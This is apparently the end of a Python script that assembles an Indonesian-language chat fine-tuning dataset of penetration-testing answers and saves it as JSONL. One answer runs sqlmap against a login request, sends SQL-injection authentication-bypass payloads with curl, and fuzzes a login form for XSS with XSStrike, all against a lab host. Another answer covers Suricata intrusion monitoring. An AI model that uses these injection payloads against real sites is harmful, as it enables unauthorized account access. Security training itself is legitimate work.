        {"from": "gpt", "value": "```bash\n# Capture login request dulu via Burp, save sebagai login_req.txt\n# Contoh format:\n# POST /login HTTP/1.1\n# Host: lab.vuln.io\n# username=admin&password=test\n\n# SQLi via sqlmap dengan request file\npython3 " + B + "/web/sqlmap/sqlmap.py \\\n  -r login_req.txt --batch --dbs --level=5 --risk=3\n\n# Auth bypass manual\ncurl -s -X POST https://lab.vuln.io/login \\\n  -d \"username=admin'--&password=anything\"\n\ncurl -s -X POST https://lab.vuln.io/login \\\n  -d \"username=admin'%20OR%20'1'='1&password=x\"\n\n# XSS di form\npython3 " + B + "/web/XSStrike/xsstrike.py \\\n  -u https://lab.vuln.io/login --data 'username=FUZZ&password=test'\n```"}
    ]},

    {"conversations": [
        {"from": "human", "value": "monitoring dan detect intrusion real-time dengan suricata"},
        {"from": "gpt", "value": "```bash\n# Cek interface yang tersedia\nip a | grep -E '^[0-9]|inet'\n\n# Jalanin Suricata\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n\n# Update rules\nsuricata-update\n\n# Monitor log real-time\ntail -f /var/log/suricata/fast.log\ntail -f /var/log/suricata/eve.json | python3 -c \"\nimport sys, json\nfor line in sys.stdin:\n    e = json.loads(line)\n    if e.get('event_type') == 'alert':\n        print(f\"[ALERT] {e['timestamp']} | {e['alert']['signature']} | {e.get('src_ip','')} -> {e.get('dest_ip','')}\") \n\"\n\n# YARA hunting di network\nyara /usr/share/yara-rules/malware/ /var/log/suricata/\n```"}
    ]},

]


if __name__ == "__main__":
    import json
    from pathlib import Path

    out = Path(__file__).parent.parent / "datasets" / "ds_part16.jsonl"
    out.parent.mkdir(exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        for entry in EXTRA_DATA_12:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    print(f"[+] Saved {len(EXTRA_DATA_12)} entries → {out}")
